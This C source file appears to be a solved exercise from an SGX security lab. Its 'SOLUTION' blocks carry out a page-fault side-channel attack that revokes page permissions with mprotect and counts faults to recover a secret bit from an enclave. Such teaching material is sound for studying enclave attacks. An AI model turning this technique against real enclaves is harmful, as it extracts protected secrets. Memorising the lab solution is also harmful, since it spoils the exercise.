/* utility headers */
#include "libsgxstep/debug.h"
#include "libsgxstep/pf.h"
#include "libsgxstep/enclave.h"
#include <sys/mman.h>

/* SGX untrusted runtime */
#include <sgx_urts.h>
#include "Enclave/encl_u.h"

#define TEST_STRING     "DeaDBEeF"

sgx_enclave_id_t create_enclave(void)
{
    sgx_launch_token_t token = {0};
    int updated = 0;
    sgx_enclave_id_t eid = -1;

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                    &token, &updated, &eid, NULL ) );

    return eid;
}

int fault_fired = 0;
void *s_pt = NULL;
void *page_pt = NULL;

void fault_handler(void *base_adrs)
{
    /* =========================== START SOLUTION =========================== */
    info("Restoring access rights..");
    ASSERT(!mprotect(page_pt, 4096, PROT_READ | PROT_WRITE));
    /* =========================== END SOLUTION =========================== */

    fault_fired++;
}

int main( int argc, char **argv )
{
    sgx_enclave_id_t eid = create_enclave();
    int rv = 1, secret = 0;
    char *string;

    /* ---------------------------------------------------------------------- */
    info("registering fault handler..");
    register_fault_handler(fault_handler);

    SGX_ASSERT( ecall_get_secret_adrs(eid, &s_pt) );
    info("secret at %p\n", s_pt);
    uintptr_t baseAddress = (uintptr_t) get_enclave_base();
    info("base adress at %p\n",baseAddress);

    /* ---------------------------------------------------------------------- */
    info_event("Calling enclave..");
    string = malloc(strlen(TEST_STRING)+1);
    strcpy(string, TEST_STRING); 
    SGX_ASSERT( ecall_to_lowercase(eid, string) );
    info("secure enclave converted '%s' to '%s'", TEST_STRING, string);

    /* =========================== START SOLUTION =========================== */
    void *page_pt2 = s_pt + 1;

    page_pt = page_pt2;

    info_event("attack SECRET=0");
    SGX_ASSERT( ecall_set_secret(eid, 0) );

    ASSERT(!mprotect(page_pt, 4096, PROT_NONE));
    fault_fired = 0;
    SGX_ASSERT( ecall_to_lowercase(eid, s_pt) );
    info("Reconstructed secret = %d", fault_fired ? 1 : 0);
    ASSERT(!mprotect(page_pt, 4096, PROT_READ | PROT_WRITE));
    
    /* ---------------------------------------------------------------------- */
    info_event("attack SECRET=1");
    SGX_ASSERT( ecall_set_secret(eid, 1) );

    ASSERT(!mprotect(page_pt, 4096, PROT_NONE));
    fault_fired = 0;
    SGX_ASSERT( ecall_to_lowercase(eid, s_pt) );
    info("Reconstructed secret = %d", fault_fired ? 1 : 0);
    ASSERT(!mprotect(page_pt, 4096, PROT_READ | PROT_WRITE));
    /* =========================== END SOLUTION =========================== */
    
    info_event("destroying SGX enclave");
    SGX_ASSERT( sgx_destroy_enclave( eid ) );

    info("all is well; exiting..");
	return 0;
}

